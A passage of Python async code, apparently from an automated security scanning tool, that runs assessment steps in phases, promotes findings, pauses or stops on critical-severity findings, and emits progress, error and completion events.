                ctx.record(phase_idx, sid, summary, output_keys)
                await counted_emit({
                    "type": "step_result",
                    "phase": phase_idx, "step": sid, "summary": summary,
                })

                promoted = await _maybe_promote_findings(
                    summary, sid, tool, counted_emit,
                )
                phase_findings += len(promoted)

                await counted_emit({
                    "type": "step_done",
                    "phase": phase_idx, "step": sid, "status": "ok",
                    "elapsed": round(time.monotonic() - s_start, 2),
                })

                critical = any(f.get("severity") == "critical" for f in promoted)
                # Pause hooks: per-preset stop_on_critical or per-step on_finding.
                if critical and (stop_on_critical or on_finding == "pause"):
                    await counted_emit({
                        "type": "critical_finding",
                        "phase": phase_idx, "step": sid,
                        "finding": promoted[0], "paused": True,
                    })
                    decision = "continue"
                    if wait_action is not None:
                        try:
                            decision = (await wait_action()) or "continue"
                        except Exception:
                            decision = "stop"
                    if decision == "stop":
                        stopped = True
                        break
                elif on_finding == "stop" and promoted:
                    stopped = True
                    break

            except asyncio.CancelledError:
                stopped = True
                await counted_emit({
                    "type": "step_done",
                    "phase": phase_idx, "step": sid, "status": "stopped",
                    "elapsed": round(time.monotonic() - s_start, 2),
                })
                break
            except Exception as e:
                await counted_emit({
                    "type": "step_done",
                    "phase": phase_idx, "step": sid, "status": "error",
                    "elapsed": round(time.monotonic() - s_start, 2),
                    "detail": f"{type(e).__name__}: {e}"[:300],
                })
                continue

        await counted_emit({
            "type": "phase_complete",
            "phase": phase_idx, "name": phase_name,
            "findings": phase_findings,
            "duration_seconds": round(time.monotonic() - phase_start_t, 2),
        })

        if stopped:
            break

    await counted_emit({
        "type": "done",
        "elapsed": round(time.monotonic() - t0, 2),
        "findings_total": findings_total,
        "stopped": stopped,
        "schema": "v2",
    })
